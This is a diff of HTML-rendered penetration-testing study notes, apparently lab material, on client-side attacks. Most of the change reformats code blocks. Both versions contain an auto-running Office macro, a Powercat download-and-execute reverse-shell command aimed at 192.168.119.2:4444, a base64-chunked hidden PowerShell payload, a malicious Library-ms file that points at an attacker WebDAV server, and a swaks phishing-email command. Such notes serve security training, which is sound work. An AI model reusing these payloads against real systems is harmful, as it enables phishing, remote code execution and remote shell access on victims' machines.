@@ -21,61 +21,77 @@
 <li>Avoid Mark of the Web (MOTW) by putting malware inside 7zip, ISO, IMG</li>
 </ul>
 </li>
-<li><p><strong>MS Office Macros</strong></p>
-<ul>
+<li><strong>MS Office Macros</strong><ul>
 <li>To make macros: View -&gt; Macros</li>
-<li>Basic macro code that opens powershell:
-```
-Sub AutoOpen()</li>
+<li>Basic macro code that opens powershell:</li>
 </ul>
-<p>MyMacro</p>
 </li>
 </ul>
-<p>End Sub
-Sub Document_Open()</p>
-<p>  MyMacro</p>
-<p>End Sub
-Sub MyMacro()</p>
-<p>  CreateObject(&quot;Wscript.Shell&quot;).Run &quot;powershell&quot;</p>
-<p>End Sub</p>
-<pre><code>-<span class="ruby"> Powercat
-</span>    -<span class="ruby"> Creates reverse shells, but detected by defender
-</span>    -<span class="ruby"> Command to download/execute the reverse <span class="hljs-symbol">shell:</span> <span class="hljs-string">`IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell`</span>
-</span>        -<span class="ruby"> This is just grabbing a hosted powershell script
-</span>        -<span class="ruby"> <span class="hljs-symbol">Powercat:</span> 
-</span>    -<span class="ruby"> Can be passed to the macro by encoding it <span class="hljs-keyword">in</span> chunks of <span class="hljs-number">50</span> base64 <span class="hljs-symbol">characters:</span>
-</span>        -<span class="ruby"> <span class="hljs-string">`Dim Str as String`</span>
-</span>        -<span class="ruby"> <span class="hljs-string">`Str = Str + "powershell.exe -nop -w hidden -enc {base64}"`</span>
-</span>        -<span class="ruby"> <span class="hljs-string">`Str = Str + {base64}"`</span>
-</span>        -<span class="ruby"> <span class="hljs-string">`CreateObject("Wscript.Shell").Run Str`</span>
-</span>
-### Abusing Windows Library Files
--<span class="ruby"> Windows library files are less well-known <span class="hljs-keyword">and</span> can be equally effective
-</span>-<span class="ruby"> Executing .Library-ms file into executing .lnk file
-</span>-<span class="ruby"> These files display remote directories like local directories, where we put .lnk file
-</span>    -<span class="ruby"> <span class="hljs-string">`pip3 install wsgidav`</span> <span class="hljs-keyword">for</span> a WebDAV server to host/serve files
-</span>    -<span class="ruby"> <span class="hljs-symbol">usage:</span> <span class="hljs-string">`wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root {directory}`</span>  
-</span>-<span class="ruby"> config.Library-ms file <span class="hljs-symbol">contents:</span></span>
-</code></pre><p>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</p>
-<p><libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
-<name>@windows.storage.dll,-34582</name></p>
-<p><version>6</version></p>
-<p><isLibraryPinned>true</isLibraryPinned></p>
-<p><iconReference>imageres.dll,-1003</iconReference></p>
-<p><templateInfo></p>
-<p><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
-</templateInfo></p>
-<p><searchConnectorDescriptionList></p>
-<p><searchConnectorDescription></p>
-<p><isDefaultSaveLocation>true</isDefaultSaveLocation></p>
-<p><isSupported>false</isSupported></p>
-<p><simpleLocation></p>
-<p><url><a href="http://192.168.119.2">http://192.168.119.2</a></url>
-</simpleLocation>
-</searchConnectorDescription>
-</searchConnectorDescriptionList>
-</libraryDescription>
-```</p>
+<pre><code>Sub AutoOpen()
+
+  MyMacro
+
+End Sub
+Sub Document_Open()
+
+  MyMacro
+
+End Sub
+Sub MyMacro()
+
+  CreateObject(&quot;Wscript.Shell&quot;).Run &quot;powershell&quot;
+
+End Sub
+</code></pre>
+<ul>
+<li>Powercat<ul>
+<li>Creates reverse shells, but detected by defender</li>
+<li>Command to download/execute the reverse shell: <code>IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.119.2/powercat.ps1&#39;);powercat -c 192.168.119.2 -p 4444 -e powershell</code><ul>
+<li>This is just grabbing a hosted powershell script</li>
+<li>Powercat:</li>
+</ul>
+</li>
+<li>Can be passed to the macro by encoding it in chunks of 50 base64 characters:<ul>
+<li><code>Dim Str as String</code></li>
+<li><code>Str = Str + &quot;powershell.exe -nop -w hidden -enc {base64}&quot;</code></li>
+<li><code>Str = Str + {base64}&quot;</code></li>
+<li><code>CreateObject(&quot;Wscript.Shell&quot;).Run Str</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="abusing-windows-library-files">Abusing Windows Library Files</h3>
+<ul>
+<li>Windows library files are less well-known and can be equally effective</li>
+<li>Executing .Library-ms file into executing .lnk file</li>
+<li>These files display remote directories like local directories, where we put .lnk file<ul>
+<li><code>pip3 install wsgidav</code> for a WebDAV server to host/serve files</li>
+<li>usage: <code>wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root {directory}</code></li>
+</ul>
+</li>
+<li>config.Library-ms file contents:</li>
+</ul>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://192.168.119.2&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+</code></pre>
 <ul>
 <li>Sending a phishing email with the share:<ul>
 <li><code>sudo swaks -t {to_email} -t {to_email} --from {from_email} --attach @config.Library-ms --server {mail_server} --body @body.txt --header &quot;Subject: Staging Script&quot; --suppress-data -ap</code></li>
